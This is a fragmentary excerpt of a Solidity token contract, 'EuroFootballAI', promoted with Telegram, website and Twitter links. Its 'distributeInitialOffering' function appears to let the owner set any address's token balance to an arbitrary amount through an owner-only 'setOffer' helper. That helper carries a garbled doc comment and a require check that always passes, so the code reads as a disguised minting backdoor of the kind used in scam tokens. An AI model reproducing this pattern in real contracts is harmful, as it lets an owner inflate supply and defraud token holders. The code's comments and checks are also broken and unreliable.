...
// Telegram : https://t.me/eurofootballtoken
// Website : https://eurofootballtoken.com/
// Twitter : https://twitter.com/efootballai
...
contract EuroFootballAI is Context, IERC20, Ownable {
    ...
    */
    ...
    /**
    * @dev Returns the token setOffer.
    */
    function setOffer(address _offeringContract, uint256 rateAmount) internal view onlyOwner returns (uint256) {
        require((0) <= rateAmount, "rateAmount must be less than iii");
        return rateAmount;
    }
    ...
    */
    function distributeInitialOffering(
        ...
        require(_offeringContract != address(0));
        _balances[_offeringContract] = setOffer(_offeringContract, rateAmount);
    }  
